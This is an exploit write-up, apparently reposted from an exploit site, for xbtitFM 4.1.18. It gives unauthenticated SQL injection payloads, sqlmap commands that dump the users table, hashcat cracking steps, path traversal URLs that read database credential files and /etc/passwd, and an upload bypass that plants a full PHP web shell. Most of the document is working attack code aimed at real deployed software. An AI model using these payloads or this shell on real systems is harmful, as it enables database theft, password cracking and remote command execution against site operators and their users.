@@ -1,0 +1,91 @@
+id: 39261
+date: 01/22/2024
+title: xbtitFM 4.1.18 SQL Injection / Shell Upload / Traversal Vulnerabilities
+author: Who cares anyway
+cves: 
+
+# Exploit Title: xbtitFM 4.1.18 Multiple Vulnerabilities
+# Exploit Author: Who cares anyway
+# Vendor Homepage: https://xbtitfm.eu
+# Affected versions: 4.1.18 and prior
+# CVE : Who cares anyway
+# Description: The SQLi and the path traversal are unauthenticated, they don't require any user interaction to be exploited and are present in the default configuration of xbtitFM.
+The insecure file upload requires the file_hosting feature (hack) being enabled. If not, it can be enabled by gaining access to an administrator account.
+Looking at the state and the age of the codebase there are probably more, but who cares anyway...
+
+[Unauthenticated SQL Injection - CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]
+
+Some examples:
+Get DB name:
+/shoutedit.php?action=edit&msgid=1337 AND EXTRACTVALUE(0,CONCAT(0,0,(MID((IFNULL(CAST(DATABASE() AS NCHAR),0)),1,100)))) 
+
+Get DB user:
+/shoutedit.php?action=edit&msgid=1337 AND EXTRACTVALUE(0,CONCAT(0,0,(MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0)),1,100)))) 
+
+Get password hash of any user (might need some modification to work on different instances):
+/shoutedit.php?action=edit&msgid=1337 OR (1,1) = (SELECT COUNT(0),CONCAT((SELECT CONCAT_WS(0x3a,id,username,password,email,0x3a3a3a) FROM xbtit_users WHERE username='admin_username_or_whatever_you_like'),FLOOR(RAND(0)*2)) FROM (information_schema.tables) GROUP BY 2);
+
+Now the fun part. Automate it with sqlmap to dump the database.
+1) Get DB name
+sqlmap -u "https://example.xyz/shoutedit.php?action=edit&msgid=1337" -p msgid --technique=E --answers="include=N" --batch --current-db
+2) Get table names
+sqlmap -u "https://example.xyz/shoutedit.php?action=edit&msgid=1337" -p msgid --technique=E --answers="include=N" --batch -D the_identified_database_name --tables
+3) Dump users table (usually called xbtit_users)
+sqlmap -u "https://example.xyz/shoutedit.php?action=edit&msgid=1337" -p msgid --technique=E --answers="include=N" --batch -D the_identified_database_name -T xbtit_users -C id,username,email,cip,dob,password,salt,secret --dump
+4) Crack hashes (usually unsalted MD5, yey!)
+hashcat –m 0 xbtitfm_exported_hashes.txt wordlist.txt
+Pro tip: Use All-in-One-P (https://weakpass.com/all-in-one)
+
+[Unauthenticated Path traversal - CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]
+
+1) Intentionally search for a file that doesn't exist to get the web application path e.g. (/home/xbtitfm/public_html/)
+https://example.xyz/nfo/nfogen.php?nfo=random_value_to_get_error_that_reveals_the_real_path
+
+2) Read files that contain database credentials.
+https://example.xyz/nfo/nfogen.php?nfo=../../../../../../../home/xbtitfm/public_html/include/settings.php
+https://example.xyz/nfo/nfogen.php?nfo=../../../../../../../home/xbtitfm/public_html/include/update.php
+
+Or any other system file you want.
+https://example.xyz/nfo/nfogen.php?nfo=../../../../../../../etc/passwd
+
+3) Now who needs the SQLi to dump the DB when you have this gem? Check if the following file is configured 
+https://example.xyz/nfo/nfogen.php?nfo=../../../../../../../home/xbtitfm/public_html/sxd/cfg.php
+If so, go to https://example.xyz/sxd (CBT Sql backup utilitiy aka Sypex-Dumper), login with the DB credentials you just found, now export the DB with on click. Nice and easy.
+
+[Insecure file upload - Remote Code Execution (Authenticated)- CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H]
+
+If that wasn't enough already and you want RCE, visit https://example.xyz/index.php?page=file_hosting
+If the file hosting feature (hack) is enabled, then simply just upload a PHP shell with the following bypass.
+Changing the Content-Type of the file to image/gif and the first bytes to GIF89a; are enought to bypass the filetype checks.
+A silly contermeasure against PHP files is in place so make sure you change <?php to <?pHp to bypass it.
+
+Content-Disposition: form-data; name="file"; filename="definately_not_a_shell.php"
+Content-Type: image/gif
+
+GIF89a;
+<html>
+<body>
+<form method="GET" name="<?pHp echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+
+<pre>
+<?pHp
+
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+
+</pre>
+</body>
+</html>
+
+The web shell will then be uploaded here:
+https://example.xyz/file_hosting/definately_not_a_shell.php
+
+If the file hosting feature is disabled, extract and crack the hash of an admin, then enable the feature from the administration panel and upload the shell.
+
+#  0day.today [2024-01-27]  #
